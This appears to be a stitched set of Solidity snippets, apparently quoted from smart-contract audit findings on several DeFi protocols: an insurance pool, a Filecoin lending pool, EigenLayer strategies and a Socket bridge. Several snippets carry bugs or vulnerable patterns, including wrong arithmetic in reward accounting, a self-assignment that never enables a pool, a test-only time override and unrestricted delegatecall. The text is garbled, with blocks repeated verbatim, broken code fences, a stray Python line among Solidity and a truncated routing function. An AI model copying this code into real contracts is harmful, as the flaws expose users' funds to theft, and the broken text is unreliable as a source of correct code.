```\nrefundMap[policyIndex][week] = incomeMap[policyIndex][week].mul(\n    allCovered.sub(maximumToCover)).div(allCovered)\n```
"```\nfunction refund(\n    uint256 policyIndex_,\n    uint256 week_,\n    address who_\n) external nonReentrant {\n    Coverage storage coverage = coverageMap[policyIndex_][week_][who_];\n\n    require(!coverage.refunded, ""Already refunded"");\n\n    uint256 allCovered = coveredMap[policyIndex_][week_];\n    uint256 amountToRefund = refundMap[policyIndex_][week_].mul(coverage.amount).div(allCovered);\n    coverage.amount = coverage.amount.mul(coverage.premium.sub(amountToRefund)).div(coverage.premium);\n    coverage.refunded = true;\n\n    IERC20(baseToken).safeTransfer(who_, amountToRefund);\n\n    if (eventAggregator!= address(0)) {\n        IEventAggregator(eventAggregator).refund(\n            policyIndex_,\n            week_,\n            who_,\n            amountToRefund\n        );\n    }\n}\n```"
```\npoolInfo.accTidalPerShare = poolInfo.accTidalPerShare.add(\n    amount * SHARE_UNITS\n).div(poolInfo.totalShare);\n```\n```\npoolInfo.accTidalPerShare = poolInfo.accTidalPerShare.add(\n    amount * SHARE_UNITS).div(poolInfo.totalShare)\n```\n```\npoolInfo.accTidalPerShare += amount * SHARE_UNITS / poolInfo.totalShare;\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.add(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.mul(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare * userInfo.share / SHARE_UNITS;\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.add(userInfo.share);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.mul(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare * userInfo.share / SHARE_UNITS;\n```
"```\nfunction claim(\n    uint256 policyIndex_,\n    uint256 amount_,\n    address recipient_\n) external onlyPoolManager {\n```"
"```\nfor (uint256 w = fromWeek_; w < toWeek_; ++w) {\n    incomeMap[policyIndex_][w] = incomeMap[policyIndex_][w].add(premium);\n    coveredMap[policyIndex_][w] = coveredMap[policyIndex_][w].add(amount_);\n    \n    require(coveredMap[policyIndex_][w] <= maximumToCover, ""Not enough to buy"");\n    coverageMap[policyIndex_][w][_msgSender()] = Coverage({\n        amount: amount_,\n        premium: premium,\n        refunded: false\n    });\n}\n```"
"```\nEvery Pool is a standalone smart contract. It is made upgradeable with OpenZeppelin's Proxy Upgrade Pattern.\n```\nAnd there will be multiple proxies and one implementation of the Pools, \nand one proxy and one implementation of EventAggregator.\n```"
```\nfor (uint256 i = 0; i < committeeMembers.length; ++i) {\n    address member = committeeMembers[i];\n    committeeArray.push(member);\n    committeeIndexPlusOne[member] = committeeArray.length;\n}\n```
```\nuint256 premium = amount_.mul(policy.weeklyPremium).div(RATIO_BASE);\nuint256 allPremium = premium.mul(toWeek_.sub(fromWeek_));\n```
```\nfunction _executeRemoveFromCommittee(address who_) private {\n```\n```\nfunction _executeChangeCommitteeThreshold(uint256 threshold_) private {\n```
"```\nuint256 constant AMOUNT_PER_SHARE = 1e18;\n```\n```\nfunction deposit(\n    uint256 amount_\n) external nonReentrant {\n    require(enabled, ""Not enabled"");\n    require(amount_ >= AMOUNT_PER_SHARE / 1000000, ""Less than minimum"");\n}\n```"
```\npragma solidity ^0.8.10;\n```\n```\npragma solidity ^0.8.10;\n```
```\ndef onlyTest():\n```\n```\nfunction setTimeExtra(uint256 timeExtra_) external onlyTest {\n```\n```\nfunction getCurrentWeek() public view returns(uint256) {\n    return (block.timestamp + TIME_OFFSET + timeExtra) / (7 * days);\n}\n```\n```\nfunction getNow() public view returns (uint256) {\n    return block.timestamp + timeExtra;\n}\n```
```\nfunction setEventAggregator(address eventAggregator_) external onlyPoolManager {\n    eventAggregator = eventAggregator_;\n}\n```\n```\nfunction enablePool(bool enabled_) external onlyPoolManager {\n    enabled_ = enabled_;\n}\n```\n```\nif (eventAggregator!= address(0)) {\n    IEventAggregator(eventAggregator).execute(\n        requestIndex_\n    );\n}\n```
"```\nfunction borrow(VerifiableCredential memory vc) external isOpen subjectIsAgentCaller(vc) {\n    if (vc.value < WAD) {\n        revert InvalidParams();\n    }\n    if (totalBorrowableAssets() < vc.value) {\n        revert InsufficientLiquidity();\n    }\n    Account memory account = _getAccount(vc.subject);\n    if (account.principal == 0) {\n        uint256 currentEpoch = block.number;\n        account.startEpoch = currentEpoch;\n        account.epochsPaid = currentEpoch;\n        GetRoute.agentPolice(router).addPoolToList(vc.subject, id);\n    }\n    account.principal += vc.value;\n    account.save(router, vc.subject, id);\n    totalBorrowed += vc.value;\n    emit Borrow(vc.subject, vc.value);\n    asset.transfer(msg.sender, vc.value);\n}\n```\n```\nmodifier subjectIsAgentCaller(VerifiableCredential memory vc) {\n    if (GetRoute.agentFactory(router).agents(msg.sender)!= vc.subject) {\n        revert Unauthorized();\n    }\n}\n```"
"```\nuint256 lostAmt = principalOwed > recoveredFunds? principalOwed - recoveredFunds : 0;\n\nuint256 totalOwed = interestPaid + principalOwed;\n\nasset.transferFrom(\n    msg.sender,\n    address(this),\n    totalOwed > recoveredFunds? recoveredFunds : totalOwed\n);\n\ntotalBorrowed -= lostAmt;\n\naccount.principal = lostAmt;\n\naccount.save(router, agentID, id);\n```"
"```\nfunction beneficiaryWithdrawable(\n    address recipient,\n    address sender,\n    uint256 agentID,\n    uint256 proposedAmount\n) external returns (uint256 amount) {\n    AgentBeneficiary memory beneficiary = _agentBeneficiaries[agentID];\n    address beneficiaryAddress = beneficiary.active.beneficiary;\n    // If the sender is not the owner of the Agent or the beneficiary, revert\n    if (!(beneficiaryAddress == sender || (IAuth(msg.sender).owner() == sender && recipient == beneficiaryAddress))) {\n        revert Unauthorized();\n    }\n    (beneficiary, amount) = beneficiary.withdraw(proposedAmount);\n    // update the beneficiary in storage\n    _agentBeneficiaries[agentID] = beneficiary;\n}\n```\n```\nif (msg.sender == owner()) {\n    sendAmount = agentPolice.beneficiaryWithdrawable(receiver, msg.sender, id, sendAmount);\n} else {\n    revert Unauthorized();\n}\n\n_poolFundsInFIL(sendAmount);\npayable(receiver).sendValue(sendAmount);\n```"
"```\nfunction borrow(VerifiableCredential memory vc) external isOpen subjectIsAgentCaller(vc) {\n    if (vc.value < WAD) {\n        revert InvalidParams();\n    }\n    if (totalBorrowableAssets() < vc.value) {\n        revert InsufficientLiquidity();\n    }\n    Account memory account = _getAccount(vc.subject);\n    if (account.principal == 0) {\n        uint256 currentEpoch = block.number;\n        account.startEpoch = currentEpoch;\n        account.epochsPaid = currentEpoch;\n        GetRoute.agentPolice(router).addPoolToList(vc.subject, id);\n    }\n    account.principal += vc.value;\n    account.save(router, vc.subject, id);\n    totalBorrowed += vc.value;\n    emit Borrow(vc.subject, vc.value);\n    asset.transfer(msg.sender, vc.value);\n}\n```"
"```\nfunction distributeLiquidatedFunds(uint256 agentID, uint256 amount) external {\n    if (!liquidated[agentID]) {\n        revert Unauthorized();\n    }\n\n    GetRoute.wFIL(router).transferFrom(msg.sender, address(this), amount);\n    _writeOffPools(agentID, amount);\n}\n```\n```\nuint256 totalOwed = interestPaid + principalOwed;\n\nasset.transferFrom(\n    msg.sender,\n    address(this),\n    totalOwed > recoveredFunds? recoveredFunds : totalOwed\n);\n\ntotalBorrowed -= lostAmt;\naccount.principal = lostAmt;\n\naccount.save(router, agentID, id);\n\nemit WriteOff(agentID, recoveredFunds, lostAmt, interestPaid);\n```"
"```\nfunction upgradeAgent(\n    address agent\n) external returns (address newAgent) {\n    IAgent oldAgent = IAgent(agent);\n    address owner = IAuth(address(oldAgent)).owner();\n    uint256 agentId = agents[agent];\n\n    // only the Agent's owner can upgrade, and only a registered agent can be upgraded\n    if (owner!= msg.sender || agentId == 0) {\n        revert Unauthorized();\n    }\n\n    // deploy a new instance of Agent with the same ID and auth\n    newAgent = GetRoute.agentDeployer(router).deploy(\n        router,\n        agentId,\n        owner,\n        IAuth(address(oldAgent)).operator()\n    );\n\n    // Register the new agent and unregister the old agent\n    agents[newAgent] = agentId;\n\n    // transfer funds from old agent to new agent and mark old agent as decommissioning\n    oldAgent.decommissionAgent(newAgent);\n\n    // delete the old agent from the registry\n    agents[agent] = 0;\n}\n```"
"```\nfunction upgradeAgent(\n    address agent\n) external returns (address newAgent) {\n    IAgent oldAgent = IAgent(agent);\n    address owner = IAuth(address(oldAgent)).owner();\n    uint256 agentId = agents[agent];\n\n    // only the Agent's owner can upgrade, and only a registered agent can be upgraded\n    if (owner!= msg.sender || agentId == 0) {\n        revert Unauthorized();\n    }\n\n    // deploy a new instance of Agent with the same ID and auth\n    newAgent = GetRoute.agentDeployer(router).deploy(\n        router,\n        agentId,\n        owner,\n        IAuth(address(oldAgent)).operator()\n    );\n\n    // Register the new agent and unregister the old agent\n    agents[newAgent] = agentId;\n\n    // transfer funds from old agent to new agent and mark old agent as decommissioning\n    oldAgent.decommissionAgent(newAgent);\n\n    // delete the old agent from the registry\n    agents[agent] = 0;\n}\n```\n```\nfunction decommissionAgent(address _newAgent) external {\n    AuthController.onlyAgentFactory(router, msg.sender);\n    if (IAgent(_newAgent).id()!= id) {\n        revert Unauthorized();\n    }\n    newAgent = _newAgent;\n    uint256 _liquidAssets = liquidAssets();\n    _poolFundsInFIL(_liquidAssets);\n    payable(_newAgent).sendValue(_liquidAssets);\n}\n```"
```\n/**\n * 4626 LOGIC\n */\n\n/**\n * @dev Converts `assets` to shares\n * @param assets The amount of assets to convert\n * @return shares - The amount of shares converted from assets\n */\nfunction convertToShares(uint256 assets) public view returns (uint256) {\n    uint256 supply = liquidStakingToken.totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0? assets : assets * supply / totalAssets();\n}\n\n/**\n * @dev Converts `shares` to assets\n * @param shares The amount of shares to convert\n * @return assets - The amount of assets converted from shares\n */\nfunction convertToAssets(uint256 shares) public view returns (uint256) {\n    uint256 supply = liquidStakingToken.totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0? shares : shares * totalAssets() / supply;\n}\n```
```\nfunction maxWithdraw(address owner) public view returns (uint256) {\n    return convertToAssets(liquidStakingToken.balanceOf(owner));\n}\n```
```\nmapping(uint256 => bool) public liquidated;\n\nmapping(uint256 => uint256[]) private _poolIDs;\n\nmapping(bytes32 => uint256) private _credentialUseBlock;\n\nmapping(uint256 => AgentBeneficiary) private _agentBeneficiaries;\n```\n```\nmapping(bytes32 => bool) private _minerRegistered;\n\nmapping(uint256 => uint64[]) private _minersByAgent;\n```
"```\nfunction mint(uint256 shares, address receiver) public isOpen returns (uint256 assets) {\n    if (shares == 0) {\n        revert InvalidParams();\n    }\n    assets = previewMint(shares);\n    asset.transferFrom(msg.sender, address(this), assets);\n    liquidStakingToken.mint(receiver, shares);\n    assets = convertToAssets(shares);\n    emit Deposit(msg.sender, receiver, assets, shares);\n}\n```"
```\nif (vc.value <= interestOwed) {\n    uint256 epochsForward = vc.value.divWadDown(interestPerEpoch);\n    account.epochsPaid += epochsForward;\n    feeBasis = vc.value;\n} else {\n```\n```\nuint256 epochsForward = vc.value.divWadDown(interestPerEpoch);\n```
"```\nfunction jumpStartAccount(address receiver, uint256 agentID, uint256 accountPrincipal) external onlyOwner {\n    Account memory account = _getAccount(agentID);\n\n    if (account.principal!= 0) {\n        revert InvalidState();\n    }\n\n    account.principal = accountPrincipal;\n    account.startEpoch = block.number;\n    account.epochsPaid = block.number;\n\n    account.save(router, agentID, id);\n\n    GetRoute.agentPolice(router).addPoolToList(agentID, id);\n\n    liquidStakingToken.mint(receiver, convertToShares(accountPrincipal));\n\n    totalBorrowed += accountPrincipal;\n}\n```"
"```\nfunction borrow(VerifiableCredential memory vc) external isOpen subjectIsAgentCaller(vc) {\n    if (vc.value < WAD) {\n        revert InvalidParams();\n    }\n    if (totalBorrowableAssets() < vc.value) {\n        revert InsufficientLiquidity();\n    }\n    Account memory account = _getAccount(vc.subject);\n    if (account.principal == 0) {\n        uint256 currentEpoch = block.number;\n        account.startEpoch = currentEpoch;\n        account.epochsPaid = currentEpoch;\n        GetRoute.agentPolice(router).addPoolToList(vc.subject, id);\n    }\n    account.principal += vc.value;\n    account.save(router, vc.subject, id);\n    totalBorrowed += vc.value;\n    emit Borrow(vc.subject, vc.value);\n    asset.transfer(msg.sender, vc.value);\n}\n```\n```\nmodifier subjectIsAgentCaller(VerifiableCredential memory vc) {\n    if (GetRoute.agentFactory(router).agents(msg.sender)!= vc.subject) {\n        revert Unauthorized();\n    }\n}\n```"
"```\nuint256 lostAmt = principalOwed > recoveredFunds? principalOwed - recoveredFunds : 0;\n\nuint256 totalOwed = interestPaid + principalOwed;\n\nasset.transferFrom(\n    msg.sender,\n    address(this),\n    totalOwed > recoveredFunds? recoveredFunds : totalOwed\n);\n\ntotalBorrowed -= lostAmt;\n\naccount.principal = lostAmt;\n\naccount.save(router, agentID, id);\n```"
"```\nfunction beneficiaryWithdrawable(\n    address recipient,\n    address sender,\n    uint256 agentID,\n    uint256 proposedAmount\n) external returns (uint256 amount) {\n    AgentBeneficiary memory beneficiary = _agentBeneficiaries[agentID];\n    address beneficiaryAddress = beneficiary.active.beneficiary;\n    // If the sender is not the owner of the Agent or the beneficiary, revert\n    if (!(beneficiaryAddress == sender || (IAuth(msg.sender).owner() == sender && recipient == beneficiaryAddress))) {\n        revert Unauthorized();\n    }\n    (beneficiary, amount) = beneficiary.withdraw(proposedAmount);\n    // update the beneficiary in storage\n    _agentBeneficiaries[agentID] = beneficiary;\n}\n```\n```\nif (msg.sender == owner()) {\n    sendAmount = agentPolice.beneficiaryWithdrawable(receiver, msg.sender, id, sendAmount);\n} else {\n    revert Unauthorized();\n}\n\n_poolFundsInFIL(sendAmount);\npayable(receiver).sendValue(sendAmount);\n```"
"```\nfunction borrow(VerifiableCredential memory vc) external isOpen subjectIsAgentCaller(vc) {\n    if (vc.value < WAD) {\n        revert InvalidParams();\n    }\n    if (totalBorrowableAssets() < vc.value) {\n        revert InsufficientLiquidity();\n    }\n    Account memory account = _getAccount(vc.subject);\n    if (account.principal == 0) {\n        uint256 currentEpoch = block.number;\n        account.startEpoch = currentEpoch;\n        account.epochsPaid = currentEpoch;\n        GetRoute.agentPolice(router).addPoolToList(vc.subject, id);\n    }\n    account.principal += vc.value;\n    account.save(router, vc.subject, id);\n    totalBorrowed += vc.value;\n    emit Borrow(vc.subject, vc.value);\n    asset.transfer(msg.sender, vc.value);\n}\n```"
"```\nfunction distributeLiquidatedFunds(uint256 agentID, uint256 amount) external {\n    if (!liquidated[agentID]) {\n        revert Unauthorized();\n    }\n\n    GetRoute.wFIL(router).transferFrom(msg.sender, address(this), amount);\n    _writeOffPools(agentID, amount);\n}\n```\n```\nuint256 totalOwed = interestPaid + principalOwed;\n\nasset.transferFrom(\n    msg.sender,\n    address(this),\n    totalOwed > recoveredFunds? recoveredFunds : totalOwed\n);\n\ntotalBorrowed -= lostAmt;\naccount.principal = lostAmt;\n\naccount.save(router, agentID, id);\n\nemit WriteOff(agentID, recoveredFunds, lostAmt, interestPaid);\n```"
"```\nfunction upgradeAgent(\n    address agent\n) external returns (address newAgent) {\n    IAgent oldAgent = IAgent(agent);\n    address owner = IAuth(address(oldAgent)).owner();\n    uint256 agentId = agents[agent];\n\n    // only the Agent's owner can upgrade, and only a registered agent can be upgraded\n    if (owner!= msg.sender || agentId == 0) {\n        revert Unauthorized();\n    }\n\n    // deploy a new instance of Agent with the same ID and auth\n    newAgent = GetRoute.agentDeployer(router).deploy(\n        router,\n        agentId,\n        owner,\n        IAuth(address(oldAgent)).operator()\n    );\n\n    // Register the new agent and unregister the old agent\n    agents[newAgent] = agentId;\n\n    // transfer funds from old agent to new agent and mark old agent as decommissioning\n    oldAgent.decommissionAgent(newAgent);\n\n    // delete the old agent from the registry\n    agents[agent] = 0;\n}\n```"
"```\nfunction upgradeAgent(\n    address agent\n) external returns (address newAgent) {\n    IAgent oldAgent = IAgent(agent);\n    address owner = IAuth(address(oldAgent)).owner();\n    uint256 agentId = agents[agent];\n\n    // only the Agent's owner can upgrade, and only a registered agent can be upgraded\n    if (owner!= msg.sender || agentId == 0) {\n        revert Unauthorized();\n    }\n\n    // deploy a new instance of Agent with the same ID and auth\n    newAgent = GetRoute.agentDeployer(router).deploy(\n        router,\n        agentId,\n        owner,\n        IAuth(address(oldAgent)).operator()\n    );\n\n    // Register the new agent and unregister the old agent\n    agents[newAgent] = agentId;\n\n    // transfer funds from old agent to new agent and mark old agent as decommissioning\n    oldAgent.decommissionAgent(newAgent);\n\n    // delete the old agent from the registry\n    agents[agent] = 0;\n}\n```\n```\nfunction decommissionAgent(address _newAgent) external {\n    AuthController.onlyAgentFactory(router, msg.sender);\n    if (IAgent(_newAgent).id()!= id) {\n        revert Unauthorized();\n    }\n    newAgent = _newAgent;\n    uint256 _liquidAssets = liquidAssets();\n    _poolFundsInFIL(_liquidAssets);\n    payable(_newAgent).sendValue(_liquidAssets);\n}\n```"
```\n/**\n * 4626 LOGIC\n */\n\n/**\n * @dev Converts `assets` to shares\n * @param assets The amount of assets to convert\n * @return shares - The amount of shares converted from assets\n */\nfunction convertToShares(uint256 assets) public view returns (uint256) {\n    uint256 supply = liquidStakingToken.totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0? assets : assets * supply / totalAssets();\n}\n\n/**\n * @dev Converts `shares` to assets\n * @param shares The amount of shares to convert\n * @return assets - The amount of assets converted from shares\n */\nfunction convertToAssets(uint256 shares) public view returns (uint256) {\n    uint256 supply = liquidStakingToken.totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0? shares : shares * totalAssets() / supply;\n}\n```
```\nfunction maxWithdraw(address owner) public view returns (uint256) {\n    return convertToAssets(liquidStakingToken.balanceOf(owner));\n}\n```
```\nmapping(uint256 => bool) public liquidated;\n\nmapping(uint256 => uint256[]) private _poolIDs;\n\nmapping(bytes32 => uint256) private _credentialUseBlock;\n\nmapping(uint256 => AgentBeneficiary) private _agentBeneficiaries;\n```\n```\nmapping(bytes32 => bool) private _minerRegistered;\n\nmapping(uint256 => uint64[]) private _minersByAgent;\n```
"```\nfunction mint(uint256 shares, address receiver) public isOpen returns (uint256 assets) {\n    if (shares == 0) {\n        revert InvalidParams();\n    }\n    assets = previewMint(shares);\n    asset.transferFrom(msg.sender, address(this), assets);\n    liquidStakingToken.mint(receiver, shares);\n    assets = convertToAssets(shares);\n    emit Deposit(msg.sender, receiver, assets, shares);\n}\n```"
```\nif (vc.value <= interestOwed) {\n    uint256 epochsForward = vc.value.divWadDown(interestPerEpoch);\n    account.epochsPaid += epochsForward;\n    feeBasis = vc.value;\n} else {\n```\n```\nuint256 epochsForward = vc.value.divWadDown(interestPerEpoch);\n```
"```\nfunction jumpStartAccount(address receiver, uint256 agentID, uint256 accountPrincipal) external onlyOwner {\n    Account memory account = _getAccount(agentID);\n\n    if (account.principal!= 0) {\n        revert InvalidState();\n    }\n\n    account.principal = accountPrincipal;\n    account.startEpoch = block.number;\n    account.epochsPaid = block.number;\n\n    account.save(router, agentID, id);\n\n    GetRoute.agentPolice(router).addPoolToList(agentID, id);\n\n    liquidStakingToken.mint(receiver, convertToShares(accountPrincipal));\n\n    totalBorrowed += accountPrincipal;\n}\n```"
"```\nfunction withdraw(address depositor, IERC20 token, uint256 amountShares)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED_WITHDRAWALS)\n    onlyStrategyManager\n{\n    require(token == underlyingToken, ""StrategyBase.withdraw: Can only withdraw the strategy token"");\n\n    uint256 priorTotalShares = totalShares;\n    require(amountShares <= priorTotalShares, ""StrategyBase.withdraw: amountShares must be less than or equal to totalShares"");\n\n    uint256 updatedTotalShares = priorTotalShares - amountShares;\n    require(updatedTotalShares >= MIN_NONZERO_TOTAL_SHARES || updatedTotalShares == 0,\n        ""StrategyBase.withdraw: updated totalShares amount would be nonzero but below MIN_NONZERO_TOTAL_SHARES"");\n\n    totalShares = updatedTotalShares;\n\n    uint256 amountToSend;\n    if (priorTotalShares == amountShares) {\n        amountToSend = _tokenBalance();\n    } else {\n        amountToSend = (_tokenBalance() * amountShares) / priorTotalShares;\n    }\n\n    underlyingToken.safeTransfer(depositor, amountToSend);\n}\n```\nfunction sharesToUnderlyingView(uint256 amountShares) public view virtual override returns (uint256) {\n    if (totalShares == 0) {\n        return amountShares;\n    } else {\n        return (_tokenBalance() * amountShares) / totalShares;\n    }\n}\n```\n```\nfunction _depositIntoStrategy(\n    address depositor,\n    IStrategy strategy,\n    IERC20 token,\n    uint256 amount\n)\n    internal\n    onlyStrategiesWhitelistedForDeposit(strategy)\n    returns (uint256 shares)\n{\n    token.safeTransferFrom(msg.sender, address(strategy), amount);\n\n    shares = strategy.deposit(token, amount);\n}\n```\n```\nfunction deposit(IERC20 token, uint256 amount)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED_DEPOSITS)\n    onlyStrategyManager\n    returns (uint256 newShares)\n{\n    require(token == underlyingToken, ""StrategyBase.deposit: Can only deposit underlyingToken"");\n\n    uint256 priorTokenBalance = _tokenBalance() - amount;\n    if (priorTokenBalance == 0 || totalShares == 0) {\n        newShares = amount;\n    } else {\n        newShares = (amount * totalShares) / priorTokenBalance;\n    }\n\n    require(newShares!= 0, ""StrategyBase.deposit: newShares cannot be zero"");\n    uint256 updatedTotalShares = totalShares + newShares;\n    require(updatedTotalShares >= MIN_NONZERO_TOTAL_SHARES,\n        ""StrategyBase.deposit: updated totalShares amount would be nonzero but below MIN_NONZERO_TOTAL_SHARES"");\n\n    totalShares = updatedTotalShares;\n    return newShares;\n}\n```\n```\nfunction depositIntoStrategyWithSignature(\n    IStrategy strategy,\n    IERC20 token,\n    uint256 amount,\n    address staker,\n    uint256 expiry,\n    bytes memory signature\n)\n    external\n    onlyWhenNotPaused(PAUSED_DEPOSITS)\n    onlyNotFrozen(staker)\n    nonReentrant\n    returns (uint256 shares)\n{\n    require(\n        expiry >= block.timestamp,\n        ""StrategyManager.depositIntoStrategyWithSignature: signature expired""\n    );\n\n    uint256 nonce = nonces[staker];\n    bytes32 structHash = keccak256(abi.encode(DEPOSIT_TYPEHASH, strategy, token, amount, nonce, expiry));\n    unchecked {\n        nonces[staker] = nonce + 1;\n    }\n    bytes32 digestHash = keccak256(abi.encodePacked(""\x19\x01"", DOMAIN_SEPARATOR, structHash));\n\n    if (Address.isContract(staker)) {\n        require(IERC1271(staker).isValidSignature(digestHash, signature) == ERC1271_MAGICVALUE,\n            ""StrategyManager.depositIntoStrategyWithSignature: ERC1271 signature verification failed"");\n    } else {\n        require(ECDSA.recover(digestHash, signature) == staker,\n            ""StrategyManager.depositIntoStrategyWithSignature: signature not from staker"");\n    }\n\n    shares = _depositIntoStrategy(staker, strategy, token, amount);\n}\n```"
"```\nuint256 updatedTotalShares = totalShares + newShares;\nrequire(updatedTotalShares >= MIN_NONZERO_TOTAL_SHARES, \n    ""StrategyBase.deposit: updated totalShares amount would be nonzero but below MIN_NONZERO_TOTAL_SHARES"");\n```\n```\nuint256 updatedTotalShares = priorTotalShares - amountShares;\n\nrequire(\n    updatedTotalShares >= MIN_NONZERO_TOTAL_SHARES || updatedTotalShares == 0,\n    ""StrategyBase.withdraw: updated totalShares amount would be nonzero but below MIN_NONZERO_TOTAL_SHARES""\n);"
"```\ncontract StrategyWrapper is IStrategy {\n    /**\n     * @title Extremely simple implementation of `IStrategy` interface.\n     * @author Layr Labs, Inc.\n     * @notice Simple, basic, ""do-nothing"" Strategy that holds a single underlying token and returns it on withdrawals.\n     * Assumes shares are always 1-to-1 with the underlyingToken.\n     * @dev Unlike `StrategyBase`, this contract is not designed to be inherited from.\n     * @dev This contract is expressly not intended for use with 'fee-on-transfer'-type tokens.\n     * Setting the `underlyingToken` to be a fee-on-transfer token may result in improper accounting.\n     */\n```"
"```\n/**\n * @notice Used to convert an amount of underlying tokens to the equivalent amount of shares in this strategy.\n * @notice In contrast to `underlyingToSharesView`, this function may make state modifications\n * @param amountUnderlying is the amount of `underlyingToken` to calculate its conversion into strategy shares\n * @dev Implementation for these functions in particular may vary significantly for different strategies\n */\nfunction underlyingToShares(uint256 amountUnderlying) external view returns (uint256);\n```\n```\n/**\n * @notice Used to convert an amount of underlying tokens to the equivalent amount of shares in this strategy.\n * @notice In contrast to `underlyingToSharesView`, this function may make state modifications\n * @param amountUnderlying is the amount of `underlyingToken` to calculate its conversion into strategy shares\n * @dev Implementation for these functions in particular may vary significantly for different strategies\n */\nfunction underlyingToShares(uint256 amountUnderlying) external view virtual returns (uint256) {\n    return underlyingToSharesView(amountUnderlying);\n}\n```\n```\n/**\n * @notice Used to convert a number of shares to the equivalent amount of underlying tokens for this strategy.\n * @notice In contrast to `sharesToUnderlyingView`, this function may make state modifications\n * @param amountShares is the amount of shares to calculate its conversion into the underlying token\n * @dev Implementation for these functions in particular may vary significantly for different strategies\n */\nfunction sharesToUnderlying(uint256 amountShares) public view virtual override returns (uint256) {\n    return sharesToUnderlyingView(amountShares);\n}\n```"
"```\nbytes32 public DOMAIN_SEPARATOR;\n```\n```\nfunction initialize(\n    address initialOwner,\n    address initialStrategyWhitelister,\n    IPauserRegistry _pauserRegistry,\n    uint256 initialPausedStatus,\n    uint256 _withdrawalDelayBlocks\n) \n    external \n    initializer \n{\n    DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, bytes(""EigenLayer""), block.chainid, address(this)));\n}\n```\nbytes32 public constant DOMAIN_TYPEHASH = \n    keccak256(""EIP712Domain(string name,uint256 chainId,address verifyingContract)"");\n```\n```\nDOMAIN_SEPARATOR = keccak256(\n    abi.encode(\n        DOMAIN_TYPEHASH,\n        bytes(""EigenLayer""),\n        block.chainid,\n        address(this)\n    )\n)\n```\nbytes32 public constant DOMAIN_TYPEHASH = \n    keccak256(""EIP712Domain(string name,uint256 chainId,address verifyingContract)"");\n```"
```\nuint256[41] private _gap;\n```
"```\nif not router.withdraws(transferId):\n    router.withdraw(_request, _sigs, _signers, _powers)\n```\n```\nif (delayThreshold > 0 && wdmsg.amount > delayThreshold) {\n    _addDelayedTransfer(wdId, wdmsg.receiver, wdmsg.token, wdmsg.amount);\n} else {\n    _sendToken(wdmsg.receiver, wdmsg.token, wdmsg.amount);\n}\n```\n```\nfunction bridgeAfterSwap(\n    uint256 amount,\n    bytes calldata bridgeData\n) external payable override {\n    CelerBridgeData memory celerBridgeData = abi.decode(\n        bridgeData,\n        (CelerBridgeData)\n    );\n```\n```\nfunction swapAndBridge(\n    uint32 swapId,\n    bytes calldata swapData,\n    StargateBridgeDataNoToken calldata stargateBridgeData\n)"
"```\n(bool success, bytes memory result) = addressAt(routeId).delegatecall(\n```\n```\n.delegatecall(swapData);\n```\n```\n.delegatecall(swapData);\n```\n```\n.delegatecall(swapData);\n```\n```\n.delegatecall(data);\n```\n```\nfunction addressAt(uint32 routeId) public view returns (address) {\n    if (routeId < 513) {\n        if (routeId < 257) {\n            if (routeId < 129) {\n                if (routeId < 65) {\n                    if (routeId < 33) {\n                        if (routeId < 17) {\n                            if (routeId < 9) {\n                                if (routeId < 5) {\n                                    if (routeId < 3) {\n                                        if (routeId == 1) {\n                                            return 0x822D4B4e63499a576Ab1cc152B86D1CFFf794F4f;\n                                        } else {\n                                            return 0x822D4B4e63499a576Ab1cc152B86D1CFFf794F4f;\n                                        }\n                                    } else {\n                                        return 0x822D4B4e63499a576Ab1cc152B86D1CFFf794F4f;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n```\n```\nif (routes[routeId] == address(0)) {\n    revert ZeroAddressNotAllowed();\n}\nreturn routes[routeId];"
"```\ncelerStorageWrapper.setAddressForTransferId(\n    transferId,\n    msg.sender\n)\n```\n/**\n * @title CelerStorageWrapper\n * @notice handle storageMappings used while bridging ERC20 and native on CelerBridge\n * @dev all functions which mutate the storage are restricted to Owner of SocketGateway\n * @author Socket dot tech.\n */\ncontract CelerStorageWrapper {\n```\n```\nfunction setAddressForTransferId(\n```\n```\nfunction deleteTransferId(bytes32 transferId) external {\n    // TO DO: implement deleteTransferId function\n}\n```"
"```\n(bool success, bytes memory result) = ONEINCH_AGGREGATOR.call(swapExtraData);\n```\n```\nemit SocketSwapTokens(\n    fromToken,\n    toToken,\n    returnAmount,\n    amount,\n    OneInchIdentifier,\n    receiverAddress\n);"
```\nfunction bridgeAfterSwap(\n```\n```\nfunction swapAndBridge(\n```\n```\nfunction bridgeERC20To(\n```
"```\n/**\n * @notice function to bridge tokens after swap. This is used after swap function call\n * @notice This method is payable because the caller is doing token transfer and bridging operation\n * @dev for usage, refer to controller implementations\n * @param swapId routeId for the swapImpl\n * @param swapData encoded data for swap\n * @param stargateBridgeData encoded data for StargateBridgeData\n */\nfunction swapAndBridge(\n```\n```\n/**\n * @notice function to store the transferId and message-sender of a bridging activity\n * @notice This method is payable because the caller is doing token transfer and bridging operation\n * @dev for usage, refer to controller implementations\n * encodedData for bridge should follow the sequence of properties in CelerBridgeData struct\n * @param transferId transferId generated during the bridging of ERC20 or native on CelerBridge\n * @param transferIdAddress message sender who is making the bridging on CelerBridge\n */\nfunction setAddressForTransferId(\n```\n```\n/**\n * @notice function to store the transferId and message-sender of a bridging activity\n * @notice This method is payable because the caller is doing token transfer and bridging operation\n * @dev for usage, refer to controller implementations\n * encodedData for bridge should follow the sequence of properties in CelerBridgeData struct\n */\nfunction deleteTransferId(bytes32 transferId) external payable {\n```"
